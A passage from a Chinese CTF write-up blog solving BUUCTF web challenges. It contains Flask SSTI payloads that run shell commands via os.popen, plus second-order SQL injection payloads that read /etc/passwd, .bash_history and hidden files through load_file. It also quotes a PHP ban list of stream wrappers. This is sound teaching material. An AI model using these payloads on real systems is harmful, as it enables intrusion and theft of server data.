class="hljs-keyword">in</span> res:<br>            pw = pw + i<br>            <span class="hljs-built_in">print</span>(pw)<br></code></pre></td></tr></table></figure><p>其中<code>\</code>放了两个是因为需要转义，在<code>python</code>中有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;it\&#x27;s my code&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\\&#x27;</span>)<br><span class="hljs-comment">#it&#x27;s my code</span><br><span class="hljs-comment">#\</span><br></code></pre></td></tr></table></figure><p>用<code>parse.unquote(&#39;%00&#39;)</code>为了防止转义<code>%00</code>，比如在登录框直接打<code>%00</code>会被转义成<code>%2500</code>：</p><p><img src="/img/2019nctfsqli9.png" alt="2019nctfsqli9"></p><p>当然也有师傅直接用的<code>\x00</code>截断，结果一样的</p><p><img src="/img/nctf2019sqli8.png" alt="nctf2019sqli8"></p><p>you_will_never_know7788990</p><p>然后直接登录就行</p><h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p><img src="/img/iluvflask1.png" alt="iluvflask1"></p><p>提示<code>FLASK</code>，猜测<code>SSTI</code>,但找不到注入点。。</p><p>这里要用<code>Arjun</code>这个东西把参数扫出来：</p><p><code>arjun -u http://c7d87961-7455-4eaa-8952-5d8c62ab0907.node4.buuoj.cn:81/ -c 100 -d 5 </code></p><p><img src="/img/iluvflask5.png" alt="iluvflask5"></p><p>后面就是简单的<code>ssti</code>了而且没啥过滤，就不详细写了</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><p><img src="/img/iluvflask3.png" alt="iluvflask3"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>没找到啥提示，<code>dirsearch</code>能扫出<code>.git</code>文件，直接访问发现<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>弄它：</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>到这里不会做了。。我一开始以为<code>$_SESSION[&#39;login&#39;]</code>这里会有利用点，但是很明显这代码也没干啥事？后面看了<code>wp</code>才知道这东西不全。。</p><p><code>Kali</code>下：</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>然后进对应文件夹看所有分支提交历史：</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>再看<code>write_do.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方好像没啥可以利用的地方。。</p><p>没给<code>register</code>界面，不过他提示了用户名和密码的一部分，<code>zhangwei``zhangwei***</code>，后面三位抓包爆破就行：<code>zhangwei666</code></p><p>注意这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>只做了单纯的转义处理，很容易知道这里可能存在二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>可以当注入点，抓包看下数据怎么传过去的：</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORY字段：<code>test&#39;,content=database()#</code></p><p>这东西放进去就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>然后在<code>comment</code>下触发就行。</p><p>但奇怪的是我的<code>payload</code>并没有触发，<code>comment</code>提交后加载不出来。。</p><p>后面才知道对于这种多行的<code>sql</code>语句要用多行注释<code>(\**\)</code>。。</p><p>我当时理解的是:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>里的这个<code>#</code>把后面所有内容全注释掉了，所以随便哪个<code>bo_id</code>中对应的内容都回显库名。</p><p>对于多行<code>sql</code>，举个栗子：</p><p><img src="/img/wdb2018comment7.png" alt="wdb2018comment7"></p><p>CATEGORY字段：<code>1&#39;,content=database(),/*</code></p><p>然后再<code>comment</code>时<code>content</code>字段改成：<code>*/#</code>，这样组合相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>第二行的<code>/*</code>与第三行的<code>*/</code>将中间注释，而第三行的<code>#</code>，将后面的<code>单引号</code>和<code>逗号</code>给注释了。</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>爆库：<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>爆表：<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>爆字段的时候会发现没有和<code>flag</code>有关的字段，看了<code>wp</code>发现这里要去看<code>user</code>这个东西：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //返回当前数据库连接的用户名</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" alt="wdb2018comment10"></p><blockquote><p> 说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>注意最后一行，<code>www</code> 用户的 <code>home</code> 目录(第五个冒号后)一般都是<code> /var/www</code>, 而这里是<code> /home/www</code></p><p>我们可以想办法读取<code>www</code>用户的操作记录：</p><blockquote><p> .bash_history保存了当前用户使用过的历史命令</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>：切换当前工作目录到<span class="hljs-regexp">/tmp/</span>目录<br>unzip html.zip：解压缩名为html.zip的文件<br>rm -f html.zip：强制删除名为html.zip的文件<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/：将名为html的目录递归地复制到/</span>var<span class="hljs-regexp">/www/</span>目录下<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>：切换当前工作目录到<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>目录<br>rm -f .DS_Store：删除名为.DS_Store的文件<br>service apache2 start：启动Apache2服务<br></code></pre></td></tr></table></figure><p>删除了<code>/var/www/html/.DS_Store</code>，但没删<code>/tmp/html/.DS_Store</code>。</p><blockquote><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符</p></blockquote><p>尝试读取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>？？？看下源码：</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>一大堆乱码，可以尝试转换成十六进制读取，为啥么这么转在网上查了一下：</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" alt="wdb2018comment18"></p><p>全选之后解码，能发现有这么个东西：</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>然后十六进制解码就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;<br>  <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-variable">$banword</span> = [<br>    <span class="hljs-comment">// no path traversal</span><br>    <span class="hljs-string">&#x27;\.\.&#x27;</span>,<br>    <span class="hljs-comment">// no stream wrapper</span><br>    <span class="hljs-string">&#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;</span>,<br>    <span class="hljs-comment">// no data exfiltration</span><br>    <span class="hljs-string">&#x27;flag&#x27;</span><br>  ];<br>  <span class="hljs-variable">$regexp</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$banword</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<span class="hljs-comment">//不允许目录穿越，ban了一些伪协议和flag关键字</span><br>  <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$regexp</span>, <span class="hljs-variable">$str</span>)) &#123;<span class="hljs-comment">//没有.*，换行绕过也行不通</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-variable">$body</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-variable">$json</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$body</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$body</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$page</span> = <span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>  <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$page</span>);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$content</span> || !<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$content</span>)) &#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;</span>;<br>  &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-comment">// no data exfiltration!!!</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/HarekazeCTF\&#123;.+\&#125;/i&#x27;</span>, <span class="hljs-string">&#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;</span>, <span class="hljs-variable">$content</span>);<span class="hljs-comment">///HarekazeCTF\&#123;.+\&#125;/i 匹配以 HarekazeCTF&#123; 开头，以 &#125; 结尾的文本</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-string">&#x27;content&#x27;</span> =&gt; <span class="hljs-variable">$content</span>]); <br></code></pre></td></tr></table></figure><p>挺好懂的一段代码，先是通过正则匹配过滤了目录穿越、一些伪协议和flag关键字。然后利用<code>file_get_contents</code>获得<code>php://input</code>中请求体的内容。然后注意这里<code>POST</code>的内容要符合<code>JSON</code>格式然后把他转换成数组。然后把数组<code>page</code>键对应的值通过<code>file_get_contents</code>函数读出来。这里注意最后的正则匹配把<code>flag</code>的格式完美匹配掉了。</p><p>没过滤<code>filter</code>所以很自然想到利用伪协议去读<code>flag</code>:</p><figure class="highlight 